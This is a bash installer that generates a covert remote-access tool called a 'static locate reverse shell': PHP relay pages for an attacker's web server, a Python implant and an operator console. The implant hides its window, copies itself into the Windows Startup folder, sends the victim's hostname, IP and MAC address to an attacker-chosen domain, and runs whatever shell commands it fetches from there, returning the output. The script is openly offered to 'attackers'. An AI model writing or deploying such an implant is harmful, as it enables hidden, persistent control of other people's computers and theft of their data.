
echo -e "\nProgram : Static locate reverse shell (SLRS)"
echo -e "Programmer name : Bibhas Das"
echo -e "Date : 10/04/2024"

echo -e "\n\nIt can be get reverse shell on port 80 only. \nNo need to paid tcp or other complecated port forwording tools"
echo -e "But It can't give full and simple shell access I mean You can't go anywhere It will sit only one dir\nand may run operations by absoulute path"
echo -e "So attacker should have exprenece with absoulte path"
echo -e "\nLicence: No nned to licenece [ Press any key ]"
read c

echo -e "[ 0 ] Creating file.txt file"
sleep 2
sudo touch file.txt
sudo chmod 777 file.txt

echo -e "\n[ 1 ] Creating reply.php file"
sleep 2
cat <<EOF > reply.php
<?php
// Get raw POST data
\$json = file_get_contents('php://input');

// Decode the JSON
\$data = json_decode(\$json, true);

if (\$data) {
    \$device_reply = '';
    \$is_duplicate = false;

    // Prepare the data block to check for duplicates
    \$check_block = "{\$data['device']};{\$data['ip']};{\$data['mac']};";

    if (file_exists("file.txt")) {
        // Read the content of the file
        \$file_content = file_get_contents("file.txt");

        // Check for duplicate only if \$data['output'] is not present
        if (!isset(\$data['output']) || \$data['output'] == '') {
            \$is_duplicate = strpos(\$file_content, \$check_block) !== false;
        }
    }

    if (!\$is_duplicate) {
        if (isset(\$data['output']) && \$data['output'] != '') {
            \$device_reply .= "<reply>";
            \$device_reply .= "{\$data['device']};";
            \$device_reply .= "{\$data['ip']};";
            \$device_reply .= "{\$data['mac']};";
            \$device_reply .= "{\$data['output']}";
            \$device_reply .= "</reply>";
        } else {
            \$device_reply .= "<active>";
            \$device_reply .= "{\$data['device']};";
            \$device_reply .= "{\$data['ip']};";
            \$device_reply .= "{\$data['mac']};";
            \$device_reply .= "</active>";
        }

        // Append the data to the file if \$device_reply is generated
        if (\$device_reply) {
            file_put_contents("file.txt", \$device_reply . "\n", FILE_APPEND);
        }
    }
} else {
    echo "Failed to decode JSON.";
}
EOF
sudo chmod 777 reply.php

echo -e "\n[ 2 ] Creating message.php file"
sleep 2
cat <<EOF > message.php
<?php \$response = ['command' => ''];echo json_encode(\$response);?>
EOF
sudo chmod 777 message.php

echo -e "\n Type domain ex: [http://127.0.0.1] : \c"
read ip


echo -e "\n[ 3 ] Creating exploit.py file"
sleep 3
cat <<EOF > exploit.py
import os
import socket
import uuid
import json
import requests
import time
import subprocess
import sys


def startup():      #This function is to make it's own copy to startup folders. Supported OS are windows,Linux
    script_path = os.path.abspath(sys.argv[0])
    if os.name == 'nt':
        home_dir = os.path.expanduser("~")
        startup_folder = os.path.join(home_dir, "AppData", "Roaming", "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
        destination_file = os.path.join(startup_folder, os.path.basename(script_path))
        
        if os.path.isfile(destination_file):
            pass
        else:
            shutil.copyfile(script_path, destination_file)




def hide(): #This function to hide the while prompt while it is executing. Supported OS windows, Linux
    name = os.name
    if name == 'nt':
        import ctypes
        SW_HIDE = 0
        GW_OWNER = 4
        console_handle = ctypes.windll.kernel32.GetConsoleWindow()
        parent_handle = ctypes.windll.user32.GetWindow(console_handle, GW_OWNER)
        ctypes.windll.user32.ShowWindow(console_handle, SW_HIDE)
        if parent_handle:
            ctypes.windll.user32.ShowWindow(parent_handle, SW_HIDE)




def run(command):
    if not command:
        return "No command provided"
    try:
        #print("Command : ",command)
        
        output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, text=True)
        if output == '':
            output = "NULL"
        return output.strip()
    except subprocess.CalledProcessError as e:
        return f"Error executing command: {e.output.strip()}"

def get_device_info():
    try:
        # Get device name
        device_name = socket.gethostname()

        # Get global IP address
        try:
            global_ip = requests.get("https://api.ipify.org", timeout=5).text
        except requests.ConnectionError:
            global_ip = "Unavailable"

        # Get MAC address
        mac_address = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff)
                                for elements in range(0, 2 * 6, 2)][::-1])

        return {
            "device": device_name,
            "ip": global_ip,
            "mac": mac_address
        }
    except Exception as e:
        return {"error": f"Error getting device info: {str(e)}"}

def main(DOMAIN):
    while True:
        # Get device information
        device_info = get_device_info()

        # Send device info to the server
        try:
            #print("Sending device info:", device_info)
            #response = requests.post("http://127.0.0.1/reply.php", json=device_info, timeout=5)
            response = requests.post(DOMAIN+"/reply.php", json=device_info, headers={'Content-Type': 'application/json'}, timeout=5)
        except Exception as e:
            print(f"Unexpected error while sending device info: {e}")
            pass
        #input()

        # Fetch and process server response
        try:
            raw_response = requests.get(DOMAIN+"/message.php", timeout=5).text
            try:
                server_response = json.loads(raw_response.replace("'", '"'))  # Handle PHP's single quotes
            except json.JSONDecodeError:
                #print(f"Invalid JSON received: {raw_response}")
                continue

            if isinstance(server_response, dict) and "command" in server_response:
                command = server_response.get("command", "").strip()
                if command:
                    #print(f"Executing command from server: {command}")
                    output = run(command)
                          
                    device_info["output"] = output
                    try:
                        #response = requests.post("http://127.0.0.1/reply.php", json=device_info, timeout=5)
                        response = requests.post(DOMAIN+"/reply.php", json=device_info, headers={'Content-Type': 'application/json'}, timeout=5)

                    except requests.RequestException as e:
                        pass
                        
        except Exception as e:
            pass
            #print(f"Unexpected error while fetching server response: {e}")

        time.sleep(4)

if __name__ == "__main__":
    hide()
    startup()
    main("${ip}")
EOF

sudo chmod 777 exploit.py









echo -e "\n[ 4 ] Creating shell.py file"
sleep 2
cat <<EOF > shell.py
import time

# File paths
FILE_PATH = "file.txt"
MESSAGE_PATH = "message.php"

def show_active_device():
    with open(FILE_PATH, "r") as file:
        content = file.read()

    # Extract active sections
    active_sections = content.split("<active>")

    # Check if there are any active sections
    if len(active_sections) > 1:
        # Get the last active section
        last_active_section = active_sections[-1]

        # Find the end of the last <active> section
        end_index = last_active_section.find("</active>")
        if end_index != -1:
            active_device = last_active_section[:end_index]
            return active_device

    print("No active device found.")
    return None

# Function to handle user input and save a command
def handle_command(active_device):
    if not active_device:
        return

    device_info = active_device.split(';')[:-1]
    command = input(f"\n{device_info}$  ")
    if command == '':
        return
    # Save the command to message.php
    with open(MESSAGE_PATH, "w") as file:
        file.write(f"<?php \$response = ['command' => '{command}'];echo json_encode(\$response);?>\n")


# Function to monitor for a new reply
def monitor_replies(active_device):
    if not active_device:
        return
    known_replies = set()

    while True:
        with open(FILE_PATH, "r") as file:
            content = file.read()
        if content.find("<reply>") != -1:
            # Extract reply
            reply_sections = content.split("<reply>")
            for section in reply_sections[1:]:
                end_index = section.find("</reply>")
                if end_index != -1:
                    reply = section[:end_index]
                    if reply not in known_replies:
                        known_replies.add(reply)
                        _r = reply.split(';')
                        print(f"\n{_r[4]:>2}")

            # Remove the current reply
            reply_start = content.find("<reply>")
            reply_end = content.find("</reply>")
            content = content[:reply_start] + content[reply_end + 9:]
            with open(FILE_PATH, "w") as file:
                file.write(content)

            # Reset the command in message.php
            with open(MESSAGE_PATH, "w") as file:
                file.write("<?php \$response = ['command' => ''];echo json_encode(\$response);?>\n")

            return
        time.sleep(5)  # Check every 5 seconds

# Main script
with open(MESSAGE_PATH, "w") as file:
    file.write("<?php \$response = ['command' => ''];echo json_encode(\$response);?>\n")
with open(FILE_PATH, "w") as file:
    file.write('')

def main():
    while True:
        active_device = show_active_device()

        # Handle user command
        handle_command(active_device)

        # Wait for reply
        monitor_replies(active_device)
        time.sleep(3)

print("\nYou should start a PHP server")
print("\nNote : You can't move form your remote system's c_working directory.\nAnd try to run with administrator privilage for more access")
ch = input("Are you ready to get shell access ? (y/n): ")
if ch == 'n':
    exit()
if __name__ == "__main__":
    main()
EOF

sudo chmod 777 shell.py

echo -e "\n[ 6 ] All files are created successfully"
